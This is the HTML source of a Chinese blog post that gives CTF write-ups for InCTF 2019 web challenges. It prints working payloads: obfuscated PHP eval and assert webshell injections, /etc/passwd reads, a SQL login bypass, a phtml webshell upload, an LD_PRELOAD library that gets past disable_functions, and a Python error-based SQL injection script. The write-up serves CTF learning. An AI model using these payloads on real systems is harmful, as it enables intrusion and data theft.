@@ -1,0 +1,207 @@
+<!DOCTYPE html><html lang="zh-Hans"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"><meta name="description" content="ctf"><meta name="keywords" content="ctf"><meta name="author" content="Somnus"><meta name="copyright" content="Somnus"><title>2019 inctf-Web部分题解WriteUp | Somnus's blog</title><link rel="shortcut icon" href="/melody-favicon.ico"><link rel="stylesheet" href="/css/index.css?version=1.6.1"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css?version=1.6.1"><meta name="format-detection" content="telephone=no"><meta http-equiv="x-dns-prefetch-control" content="on"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  }
+} </script></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar" data-display="true"><div class="toggle-sidebar-info text-center"><span data-toggle="切换文章详情">切换站点概览</span><hr></div><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar"></div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1-0"><span class="toc-number">1.</span> <span class="toc-text">PHP+1.0</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-1-5"><span class="toc-number">2.</span> <span class="toc-text">PHP+1.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP-2-5"><span class="toc-number">3.</span> <span class="toc-text">PHP+2.5</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Copy-Cat"><span class="toc-number">4.</span> <span class="toc-text">Copy-Cat</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GoSQLv2"><span class="toc-number">5.</span> <span class="toc-text">GoSQLv2</span></a></li></ol></div></div><div class="author-info hide"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">Somnus</div><div class="author-info__description text-center">与其哀叹，不如埋头苦干</div><div class="follow-button"><a href="https://Nikoeurus.github.io">Follow Me</a></div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">文章</span><span class="pull-right">74</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">标签</span><span class="pull-right">14</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">分类</span><span class="pull-right">24</span></a></div><hr><div class="author-info-links"><div class="author-info-links__title text-center">Links</div><a class="author-info-links__name text-center" href="https://mochazz.github.io" target="_blank" rel="noopener">七月火</a></div></div></div><div id="content-outer"><div class="no-bg" id="top-container"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">Somnus's blog</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus">   <a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a></span><span class="pull-right"></span></div><div id="post-info"><div id="post-title">2019 inctf-Web部分题解WriteUp</div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2019-09-26</time><span class="post-meta__separator">|</span><i class="fa fa-inbox post-meta__icon" aria-hidden="true"></i><a class="post-meta__categories" href="/categories/ctf/">ctf</a></div></div></div><div class="layout" id="content-inner"><article id="post"><div class="article-container" id="post-content"><p>2019 inctf-Web部分题解<a id="more"></a></p>
+<h3 id="PHP-1-0"><a href="#PHP-1-0" class="headerlink" title="PHP+1.0"></a>PHP+1.0</h3><p><img src="../../../../img/inctf/1.png" alt=""></p>
+<p>首先需要不满足函数<strong>is_file</strong>但满足<strong>file_exists</strong></p>
+<p><strong>is_file</strong>函数是判断文件存不存在，而<strong>file_exists</strong>函数则是判断文件或者<strong>目录</strong>存不存在</p>
+<p>所以，输入一个存在目录，<strong>is_file</strong>判断不是文件返回<strong>false</strong>，而<strong>file_exists</strong>则判断目录是存在返回<strong>true</strong></p>
+<p>接着就是绕过黑名单的限制执行命令：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span> (get_defined_functions()[<span class="string">'internal'</span>] <span class="keyword">as</span> $blacklisted) &#123;</span><br><span class="line">      <span class="keyword">if</span> (preg_match (<span class="string">'/'</span> . $blacklisted . <span class="string">'/im'</span>, $input)) &#123;</span><br><span class="line">          <span class="keyword">echo</span> <span class="string">"Your input is blacklisted"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">          <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>get_defined_functions()[‘internal’]</strong>是php的内置函数方法，其中过滤了最关键的下划线<strong>_</strong>，<strong>phpinfo()</strong>等</p>
+<p>想到SUCTF的EasyPHP那道题，直接使用异或构造<strong>_GET</strong>实现多参数执行函数的方式</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;[a]();&amp;thisfile=/var&amp;a=phpinfo</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/2.png" alt=""></p>
+<p>成功执行phpinfo</p>
+<p>然后查看<strong>disable_functions</strong>，发现禁用了<strong>scandir</strong>，<strong>system</strong>，exec，shell_exec，file_get_contents等函数</p>
+<p><img src="../../../../img/inctf/3.png" alt=""></p>
+<p>读取文件函数还有<strong>show_source</strong>没被禁用，尝试读取/etc/passwd</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;[a](&apos;/etc/passwd&apos;);&amp;thisfile=/var&amp;a=show_source</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/4.png" alt=""></p>
+<p>但是读取/flag发现失败了，发现/flag是不可读的文件，所以只能想办法构造getshell</p>
+<p>由于eval特性是执行一次代码，我们构造<strong>_GET</strong>和<strong>_POST</strong>就必须要执行一次，所以就必须要再嵌套进一个eval</p>
+<p>payload:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$b=$&#123;%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff&#125;[a];eval($b);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/5.png" alt=""></p>
+<p>蚁剑连接，发现根目录下面有个<strong>readFlag</strong></p>
+<p><img src="../../../../img/inctf/6.png" alt=""></p>
+<p>终端执行即可获得flag</p>
+<p><img src="../../../../img/inctf/7.png" alt=""></p>
+<p>另外，虽然过滤了<strong>scandir</strong>，可以使用<strong>glob</strong></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$b=$&#123;%a0%b8%ba%ab^%ff%ff%ff%ff&#125;[a];eval($b);&amp;thisfile=/var&amp;a=print_r(glob(%27/*%27));</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/8.png" alt=""></p>
+<p><a href="https://ctftime.org/writeup/16595" target="_blank" rel="noopener">https://ctftime.org/writeup/16595</a> </p>
+<p>网上另外的题解payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?input=$descr=array(0=&gt;array(&apos;p&apos;.&apos;ipe&apos;,&apos;r&apos;),1=&gt;array(&apos;p&apos;.&apos;ipe&apos;,&apos;w&apos;),2=&gt;array(&apos;p&apos;.&apos;ipe&apos;,&apos;w&apos;));$pxpes=array();$process=eval(&apos;return%20proc&apos;.$thisfille[8].&apos;open(&quot;/readFlag&quot;,$descr,$pxpes);&apos;);eval(&apos;echo(fge&apos;.&apos;ts($pxpes[1]));&apos;);&amp;thisfile=/lib/x86_64-linux-gnu</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Equivalent to:</span><br><span class="line">$descr = array(</span><br><span class="line">    0 =&gt; array(</span><br><span class="line">        &apos;pipe&apos;,</span><br><span class="line">        &apos;r&apos;</span><br><span class="line">    ) ,</span><br><span class="line">    1 =&gt; array(</span><br><span class="line">        &apos;pipe&apos;,</span><br><span class="line">        &apos;w&apos;</span><br><span class="line">    ) ,</span><br><span class="line">    2 =&gt; array(</span><br><span class="line">        &apos;pipe&apos;,</span><br><span class="line">        &apos;w&apos;</span><br><span class="line">    )</span><br><span class="line">);</span><br><span class="line">$pxpes = array();</span><br><span class="line">$process = eval(&apos;return proc_open(&quot;/readFlag&quot;, $descr, $pxpes);&apos;);</span><br><span class="line">echo (fgets($pxpes[1]));</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$proc=proc_open(&apos;/readFlag&apos;,[[&apos;pipe&apos;,&apos;r&apos;],[&apos;pipe&apos;,&apos;w&apos;],[&apos;pipe&apos;,&apos;w&apos;]],$pipes);var_dump(stream_get_contents($pipes[1]));</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/9.png" alt=""></p>
+<h3 id="PHP-1-5"><a href="#PHP-1-5" class="headerlink" title="PHP+1.5"></a>PHP+1.5</h3><p><img src="../../../../img/inctf/13.png" alt=""></p>
+<p>相较于上一关多了对输入参数<strong>$input</strong>的一层过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$blacklist = <span class="string">"exit|die|eval|\[|\]|\\\|\*|`|-|\+|~|\&#123;|\&#125;|\"|\'"</span>;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/$blacklist/i"</span>, $input))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"Do you really you need that?"</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果用上一关的payload，这关最为致命的就是过滤了<strong>eval</strong>，<strong>‘’</strong>，<strong>“”</strong>，<strong>{}</strong>，<strong>[]</strong></p>
+<p>花括号的过滤将直接导致我们无法直接访问数组的元素，至于引号的过滤，导致我们不能直接使用字符串</p>
+<p>这关就需要利用到PHP的一个经典特性：“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。 Ascii码大于 0x7F 的字符都会被当作字符串</p>
+<p><img src="../../../../img/inctf/14.png" alt=""></p>
+<p>如上图所示，虽然phpinfo这些字母没有添加引号，但是PHP会自动将这些字符当作字符串，那我们试着传入eval，看看能不能执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$a=p.h.p.i.n.f.o;$a();&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/15.png" alt=""></p>
+<p>成功执行，那么其他函数呢</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$a=s.h.o.w.(%a0^%ff).s.o.u.r.c.e;$b=(%d0^%ff).e.t.c.(%d0^%ff).p.a.s.s.w.d;$a($b);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/16.png" alt=""></p>
+<p>这样，我们就可以任意构造函数执行了，那么要getshell，剩下的就是构造出参数<strong>$_GET[]</strong>了</p>
+<p>首先构造出<strong>$_GET</strong>，虽然<strong>{}</strong>被过滤了，但是我们还是可以通过<strong>$b=”_GET”;$$b;</strong>的形式来构造</p>
+<p>最后就是访问数组元素了，[]{}的过滤导致我们不能直接访问，但是，我们可以通过操作数组的函数，例如<strong>current</strong>，<strong>end</strong>，<strong>next</strong>来访问，前面我们利用PHP特性任意构造函数了，所以这些函数我们都可以随意使用</p>
+<p>最后getshell的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$b=%a0%af%b0%ac%ab^%ff%ff%ff%ff%ff;$g=$$b;$a=e.n.d;$h=$a($g);$c=a.s.s.e.r.t;$c($h);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/11.png" alt=""></p>
+<p>这里执行命令的函数换成了<strong>assert</strong>，因为<strong>eval</strong>的话会报错，换成了assert的一句话，我们只能使用老版本的菜刀进行连接</p>
+<p><img src="../../../../img/inctf/17.png" alt=""></p>
+<p>根目录下文件一样，同样终端执行<strong>/readFlag</strong></p>
+<p><img src="../../../../img/inctf/10.png" alt=""></p>
+<p>网上另外的题解：<a href="https://furutsuki.hatenablog.com/entry/2019/09/23/225011" target="_blank" rel="noopener">https://furutsuki.hatenablog.com/entry/2019/09/23/225011</a> </p>
+<p>外国佬的思路同样是利用<strong>proc_open</strong>函数来执行命令，将执行的结果写入到<strong>/tmp/x</strong>中，再读取，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">proc_open(&quot;/readFlag&gt;/tmp/hhx&quot;,array(),$z);</span><br><span class="line"></span><br><span class="line">?input=$a=p.r.o.c.(%a0^%ff).o.p.e.n;$a((%d0^%ff).r.e.a.d.F.l.a.g.(%c1^%ff).(%d0^%ff).t.m.p.(%d0^%ff).h.h.x,array(),$z);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p>然后通过<strong>show_source</strong>读取：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?input=$a=s.h.o.w.(%a0^%ff).s.o.u.r.c.e;$b=(%d0^%ff).t.m.p.(%d0^%ff).h.h.x;$a($b);&amp;thisfile=/var</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/19.png" alt=""></p>
+<h3 id="PHP-2-5"><a href="#PHP-2-5" class="headerlink" title="PHP+2.5"></a>PHP+2.5</h3><p><img src="../../../../img/inctf/18.png" alt=""></p>
+<p>第三关又多了一层过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strlen($input)&gt;<span class="number">100</span>)&#123;  <span class="comment">#That is random no. I took ;)</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is getting really large input..."</span> . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>限制了输入的长度不能超过100，完全不影响之前的payload</p>
+<p>第二关的payload扔进去就行</p>
+<p><img src="../../../../img/inctf/12.png" alt=""></p>
+<h3 id="Copy-Cat"><a href="#Copy-Cat" class="headerlink" title="Copy-Cat"></a>Copy-Cat</h3><p>代码审计题</p>
+<p><img src="../../../../img/inctf/128.png" alt=""></p>
+<p>登陆界面，首先来到<strong>login.php</strong></p>
+<p><img src="../../../../img/inctf/129.png" alt=""></p>
+<p>看样子是要注入，参数username和password经过<strong>check</strong>函数的过滤，check函数在<strong>functions.php</strong>中</p>
+<p><img src="../../../../img/inctf/130.png" alt=""></p>
+<p>参数username和password经过<strong>mysql_real_escape_string</strong>的过滤，然后经过了长度的限制，如果长度大于11，则截取前11位，那么我们就可以利用截取来使转义的<strong>\</strong>逃逸</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1234567890\&amp;password= or 1#</span><br></pre></td></tr></table></figure>
+
+<p>登陆后，来到<strong>admin.php</strong></p>
+<p><img src="../../../../img/inctf/131.png" alt=""></p>
+<p><img src="../../../../img/inctf/132.png" alt=""></p>
+<p>跟踪is_login和is_admin函数</p>
+<p><img src="../../../../img/inctf/133.png" alt=""></p>
+<p>通过login.php，我们已经通过注入使得<code>$_SESSION[&#39;logged&#39;] == 1</code></p>
+<p>那么接下来就设法让<code>$_SESSION[&#39;admin&#39;] == True</code></p>
+<p>来到<strong>remote_admin.php</strong></p>
+<p><img src="../../../../img/inctf/134.png" alt=""></p>
+<p>要使得<code>$_SESSION[&#39;admin&#39;] == True</code>，就需要满足<code>$_SERVER[&#39;REMOTE_ADDR&#39;]==&quot;127.0.0.1&quot;</code>，就需要执行函数<strong>admin_$random()</strong>，但是<strong>$random</strong>为随机数，我们自然不知道</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$remote_admin = create_function(&quot;&quot;,&apos;if(isset($_SERVER[&quot;HTTP_I_AM_ADMIN&quot;]))&#123;$_SERVER[&quot;REMOTE_ADDR&quot;] = $_SERVER[&quot;HTTP_I_AM_ADMIN&quot;];&#125;&apos;);</span><br></pre></td></tr></table></figure>
+
+<p>目光来到<strong>匿名函数</strong>：<a href="http://www.laruence.com/2010/06/20/1602.html" target="_blank" rel="noopener">http://www.laruence.com/2010/06/20/1602.html</a> </p>
+<p>创建的匿名函数，通过<strong>%00lambda_x</strong>来调用，x为产生的随机数</p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /cat/remote_admin.php?random=%00lambda_2 HTTP/1.1</span><br><span class="line">Host: 192.168.199.170</span><br><span class="line">...</span><br><span class="line">I-AM-ADMIN:127.0.0.1 </span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+
+<p>再次来到<strong>admin.php</strong>，就能看到上传页面</p>
+<p><img src="../../../../img/inctf/135.png" alt=""></p>
+<p>upload.php：</p>
+<p><img src="../../../../img/inctf/136.png" alt=""></p>
+<p>上传最后会告诉我们路径，现在就是跟踪<strong>ExtractZipFile</strong>和<strong>CheckDir</strong>这两个函数，看看对上传的文件做了什么过滤</p>
+<p><img src="../../../../img/inctf/137.png" alt=""></p>
+<p>审计后发现，上传后首先调用了PHP自用类<strong>ZipArchive</strong>对上传的压缩包进行解压，然后对压缩路径下的文件名后缀做了检查，过滤了<strong>php</strong>，<strong>pl</strong>，<strong>py</strong>，<strong>asp</strong>等后缀文件，但是<strong>phtml</strong>后缀并没有被过滤</p>
+<p>所以，我们将一个phtml的文件马压缩后上传，得到上传路径后便可以进行访问</p>
+<p><img src="../../../../img/inctf/138.png" alt=""></p>
+<p>disable_functions过滤的函数：</p>
+<p><img src="../../../../img/inctf/20.png" alt=""></p>
+<p>没用过滤<strong>scandir</strong>，<strong>show_source</strong>，<strong>proc_open</strong></p>
+<p>先看看根目录下的文件：</p>
+<p><img src="../../../../img/inctf/21.png" alt=""></p>
+<p>同样是需要通过执行<strong>/readFlag</strong>来读取flag</p>
+<p>用前几关的<strong>proc_open</strong>函数，payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.phtml?_=$proc=proc_open(%27/readFlag%27,[[%27pipe%27,%27r%27],[%27pipe%27,%27w%27],[%27pipe%27,%27w%27]],$pipes);var_dump(stream_get_contents($pipes[1]));</span><br></pre></td></tr></table></figure>
+
+<p><img src="../../../../img/inctf/22.png" alt=""></p>
+<p>当然，也有其他方法来bypass disable_functions，这里虽然过滤了<strong>mail</strong>，<strong>error_log</strong></p>
+<p>但是<strong>mb_send_mail</strong>函数未被过滤</p>
+<p>编写<strong>evil.c</strong>：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__ ((__constructor__)) <span class="function"><span class="keyword">void</span> <span class="title">neko</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">  unsetenv(<span class="string">"LD_PRELOAD"</span>);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *cmd = getenv(<span class="string">"NYAN"</span>);</span><br><span class="line">  system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC evil.c -o evil.so</span><br></pre></td></tr></table></figure>
+
+<p>编译后将evil.so文件压缩上传，然后在马中执行payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/1.phtml?_=putenv(&quot;LD_PRELOAD=/var/www/html/cat/uploads/bc22993ec80ada190c0524affc17a946/evil.so&quot;);putenv(%27NYAN=/readFlag%20&gt;%20/tmp/somnus%27);mb_send_mail(%27%27,%27%27,%27%27);</span><br></pre></td></tr></table></figure>
+
+<p>最后读取<strong>/tmp/somnus</strong>即可</p>
+<p><img src="../../../../img/inctf/23.png" alt=""></p>
+<h3 id="GoSQLv2"><a href="#GoSQLv2" class="headerlink" title="GoSQLv2"></a>GoSQLv2</h3><p><img src="../../../../img/inctf/24.png" alt=""></p>
+<p>需要我们以执行sql查询后的用户名字段值为<strong>admin</strong>，把绝大多数的关键字都过滤了，可谓是过滤的非常干净</p>
+<p>但是，我们可以看到，虽然过滤了空格，但是制表符Tab：<strong>%09</strong>是没有被过滤的</p>
+<p>在MySQL中，<code>&#39;a&#39; &#39;dmi&#39; &#39;n&#39; = &#39;admin&#39;</code>利用水平和垂直制表符也可用作空白字符 </p>
+<p><img src="../../../../img/inctf/139.png" alt=""></p>
+<p>payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=a&apos;%09&apos;dmi&apos;%09&apos;n</span><br></pre></td></tr></table></figure>
+
+<p>跳转到<strong>did_you_try_last_year_link.php</strong></p>
+<p>然后是SSRF页面，需要注出数据库用户名<strong>user()</strong>来写shell</p>
+<p>我们可以注意到当sql语句执行错误时，会返回信息：<strong>Having a query problem</strong></p>
+<p>那么我们就可以报错信息进行报错注入，并且<strong>extractvalue</strong>没用被过滤，不过过滤了<strong>and</strong>，用<strong>-</strong>来代替即可</p>
+<p><strong>concat</strong>也被过滤，用<strong>elt</strong>来代替</p>
+<p><img src="../../../../img/inctf/140.png" alt=""></p>
+<p>可以发现，当第一个参数值为1时，会将<strong>@</strong>作为结果输入，而当<strong>elt</strong>拼接上<strong>extractvalue</strong>时，有查询结果时会报错，没有查询结果时则不会报错</p>
+<p><img src="../../../../img/inctf/141.png" alt=""></p>
+<p>所以，报错注入的payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name=&apos;-extractvalue(1,elt(0,&apos;@&apos;))--%09 =&gt; 不报错 =&gt; You are not admin</span><br><span class="line">?name=&apos;-extractvalue(1,elt(1,&apos;@&apos;))--%09 =&gt; 报错   =&gt; Having a query problem</span><br></pre></td></tr></table></figure>
+
+<p>接下来思考注入的判断语句，这里<strong>=</strong>，<strong>&gt;</strong>，<strong>like</strong>都被过滤了，所以我们不能构造判断等式，只能构造单一的表达式</p>
+<p>这里首先注出用户名的长度</p>
+<p>再利用用户名的长度和我们已知的用户名后缀<strong>@localhost</strong>，注出用户名，exp如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://192.168.199.170/gosql/?name="</span></span><br><span class="line">length = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get length(user())</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    payload = <span class="string">"'-extractvalue(1,elt(length(user())-"</span>+str(length)+<span class="string">",'@'))--%09"</span></span><br><span class="line">    r = requests.get(url+payload)</span><br><span class="line">    length = length + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="string">"Having a query problem"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        print(<span class="string">"length: "</span> + str(length))</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#get user</span></span><br><span class="line">user = <span class="string">"@localhost"</span></span><br><span class="line">s = <span class="string">"0123456789abcdefghijklmnopqrstuvwxyz_"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(length-len(user)):</span><br><span class="line">    l = length - len(user)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> s:</span><br><span class="line">        payload = <span class="string">"'-extractvalue(1,elt("</span>+str(l)+<span class="string">"-length(replace(user(),'"</span>+j+user+<span class="string">"','')),'@'))--%09"</span></span><br><span class="line">        r = requests.get(url+payload)</span><br><span class="line">        <span class="comment">#print("payload: "+payload)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"Having a query problem"</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            user = j + user</span><br><span class="line">            print(user)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
+
+<p>注出用户名长度后注出用户名的思路是：我们目前已知用户名末尾<strong>@localhost</strong>，那么将上一步注出的用户名长度减去末尾<strong>@localhost</strong>的长度，就等于我们接下来要注出用户名的长度<strong>l</strong>。然后从<strong>@localhost</strong>反向逐位注入，每当一位正确时，通过<strong>replace</strong>函数将<code>j+user</code>，即这一位和末尾已知的用户名替换为空，那么长度便为相对于原来<strong>l</strong>减1，那么<strong>elt</strong>函数最后输出字符，结合<strong>extractvalue</strong>就会报错，即返回<strong>Having a query problem</strong></p>
+<p>最后的执行结果：</p>
+<p><img src="../../../../img/inctf/142.png" alt=""></p>
+<p>用户名：<strong>iamspyd3r@localhost</strong></p>
+<p>得到用户名后面需要写shell，等有docker后再复现</p>
+</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined" target="_blank" rel="noopener">Somnus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nikoeurus.github.io/2019/09/26/inctf-Web/">https://nikoeurus.github.io/2019/09/26/inctf-Web/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" rel="noopener">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://Nikoeurus.github.io">Somnus's blog</a>！</span></div></div><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><nav id="pagination"><div class="prev-post pull-left"><a href="/2019/10/14/RoarCTF/"><i class="fa fa-chevron-left">  </i><span>2019 RoarCTF部分题解WriteUp</span></a></div><div class="next-post pull-right"><a 